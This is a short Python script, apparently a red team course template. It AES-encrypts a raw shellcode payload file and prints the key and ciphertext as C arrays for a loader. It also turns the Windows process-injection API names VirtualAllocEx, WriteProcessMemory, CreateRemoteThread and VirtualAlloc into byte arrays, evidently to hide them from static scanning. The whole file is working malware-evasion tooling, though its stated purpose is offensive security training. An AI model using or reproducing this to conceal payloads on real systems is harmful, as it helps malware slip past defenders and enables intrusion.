# Red Team Operator course code template
# payload encryption with AES
# 
# author: reenz0h (twitter: @sektor7net)

import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):

	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)

	return cipher.encrypt(bytes(plaintext))


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()
ciphertext = aesenc(plaintext, KEY)



# Payload section
print('char key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('unsigned char calc_payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
print("unsigned int calc_len = sizeof(calc_payload);")




# Obfus section
sVirtualAllocEx = "VirtualAllocEx"
sWriteProcessMemory = "WriteProcessMemory"
sCreateRemoteThread = "CreateRemoteThread"
sVirtualAlloc = "VirtualAlloc"

print('unsigned char sVirtualAllocEx[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sVirtualAllocEx) + ' };')
print('unsigned char sWriteProcessMemory[] =  { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sWriteProcessMemory) + ' };')
print('unsigned char sCreateRemoteThread[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sCreateRemoteThread) + ' };')
print('unsigned char sVirtualAlloc[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in sVirtualAlloc) + ' };')
